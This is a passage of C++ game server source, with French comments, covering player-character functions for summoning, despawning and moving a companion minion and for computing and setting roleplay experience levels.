                  ThisMinion->SendUnitMessage( MSG_OnPopup, ThisMinion, NULL, NULL, NULL, NULL );
                  Broadcast::BCSpellEffect( ThisMinion->GetWL(), 30, 30304, GetID(), 0, GetWL(),GetWL(),GetNextGlobalEffectID(),0);


                  //Set this minion to player
                  m_pMinions = (Minions*)ThisMinion;
                  SetFlag(__FLAG_MINIONS_DISPLAYED,1);
                  SetFlag(__FLAG_MINIONS_CALL_FLOOD_CNT,0);
                  MinionLastCall = TFCMAIN::GetRound();


                  CString strTmp;
                  strTmp.Format(_STR( 15365, GetLang() ),m_pMinions->GetRealName());
                  SendInfoMessage(strTmp,CL_YELLOW);
               }
            }
         }
      }
   }
   catch (...)
   {
   }
}

int Character::GetRP_XPLevel()
{
   int iLevel = 0;
   for(int i=0;i<100;i++)
   {
      if(GetRP_XP() > theApp.g_dwRPXPTable[i])
      {
         iLevel++;
      }
      else
         return iLevel;
   }
   return iLevel;
}

void Character::SetRP_XP     ( int iVal )  
{
   m_iRPXP = iVal;
   if(m_iRPXP < 0)
      m_iRPXP = 0;

}

void Character::SetRP_XPLevel(int iLevel)
{
   if(iLevel >99)
      iLevel = 99;
   SetRP_XP(theApp.g_dwRPXPTable[iLevel]);

   if(iLevel <= 5 && ViewFlag(__FLAG_INTERACTION_RP) == 1)
   {
      SetFlag(__FLAG_INTERACTION_RP,0);
      TFormat format;
      SendSystemMessage( format(_STR(15410, GetLang())), CL_ORANGE );
   }
   else if(iLevel >= 10 && ViewFlag(__FLAG_INTERACTION_RP) == 0)
   {
      SetFlag(__FLAG_INTERACTION_RP,1);
      TFormat format;
      SendSystemMessage( format(_STR(15409, GetLang())), CL_ORANGE );
   }
}

void Character::DestroyMinion()
{
   if(m_pMinions)
   {
      SetFlag(__FLAG_MINIONS_DISPLAYED,0);
      m_pMinions->VaporizeUnit(false);
      delete m_pMinions;
      m_pMinions = NULL;
   }
}


void Character::SetCompagnonName(CString strName)
{
   m_strCompagnonName = strName;

   CString strTmp;
   strTmp.Format(_STR( 15369, GetLang() ),m_strCompagnonName);
   SendInfoMessage(strTmp,CL_YELLOW);
}

void Character::ManageMinionMaintenance()
{
   //ceci doit etre caller uniquement dans un LOCK de character... IMP
   if(m_pMinions)
   {
      char chCombat = GetNMCombatMode();
      int iShow = ViewFlag(__FLAG_MINIONS_DISPLAYED);
      if(iShow == 0 || chCombat)
      {
         if(chCombat)
         {
            CString strTmp;
            strTmp.Format(_STR( 15367, GetLang() ),m_pMinions->GetRealName());
            SendInfoMessage(strTmp,CL_YELLOW);
         }
         else
         {
            CString strTmp;
            strTmp.Format(_STR( 15366, GetLang() ),m_pMinions->GetRealName());
            SendInfoMessage(strTmp,CL_YELLOW);
         }
         SetFlag(__FLAG_MINIONS_DISPLAYED,0);
         //on doit detruire le minions
         m_pMinions->VaporizeUnit(false);
         delete m_pMinions;
         m_pMinions = NULL;
      }
      else
      {
         bool toFar = false;
         if(abs(m_pMinions->GetWL().X - GetWL().X) >5 || abs(m_pMinions->GetWL().Y - GetWL().Y) >5)
            toFar = true;

         if(m_pMinions->GetWL().world != GetWL().world || toFar)
         {
            m_pMinions->Teleport(GetWL(),0);
            m_pMinions->SetLastMoveTime(TFCMAIN::GetRound());
         }
         else
         {
            if(TFCMAIN::GetRound() > m_pMinions->GetLastMoveTime() + MinionMovealoneTime)
            {
               //Random move minion
                char searchway = 0;
                int iDir =  rnd( 1, 8 );
                switch( iDir )
                {
                   case RQ_MoveNorth:               // NORTH
                     if(GetWL().Y - m_pMinions->GetWL().Y <3)
                        searchway = DIR::north;
                   break;
                   case RQ_MoveNorthEast:               // NORTHEAST
                      if(GetWL().Y - m_pMinions->GetWL().Y <3 && m_pMinions->GetWL().X - GetWL().X < 3)
                         searchway = DIR::northeast;
                   break;
                   case RQ_MoveEast:                // EAST
                      if(m_pMinions->GetWL().X - GetWL().X <3)
                         searchway = DIR::east;
                   break;
                   case RQ_MoveSouthEast:				   // SOUTHEAST
                     if(m_pMinions->GetWL().Y- GetWL().Y < 3 && m_pMinions->GetWL().X - GetWL().X < 3)
                     searchway = DIR::southeast;
                   break;
                   case RQ_MoveSouth:                // SOUTH
                      if(m_pMinions->GetWL().Y - GetWL().Y <3)
                         searchway = DIR::south;
                   break;
                   case RQ_MoveSouthWest:                // SOUTHWEST
                     if(m_pMinions->GetWL().Y- GetWL().Y < 3 && GetWL().X - m_pMinions->GetWL().X < 3)
                        searchway = DIR::southwest;
                   break;
                   case RQ_MoveWest:		           // WEST
                      if(GetWL().X - m_pMinions->GetWL().X <3)
                         searchway = DIR::west;
                   break;
                   case RQ_MoveNorthWest:                // NORTHWEST						
                     if(GetWL().Y - m_pMinions->GetWL().Y <3 && GetWL().X - m_pMinions->GetWL().X < 3)
                        searchway = DIR::northwest;
                   break;
                   default:
                   
                   break;
                }
                if(searchway >0)
                   m_pMinions->MoveUnit((DIR::MOVE)searchway,false,true,true);
                m_pMinions->SetLastMoveTime(TFCMAIN::GetRound());
            }
         }
      }
   }
   else
   {
      int iShow = ViewFlag(__FLAG_MINIONS_DISPLAYED);
      if(iShow)
      {
         SetFlag(__FLAG_MINIONS_DISPLAYED,0);
         ShowMinion(true);
      }
   }
}








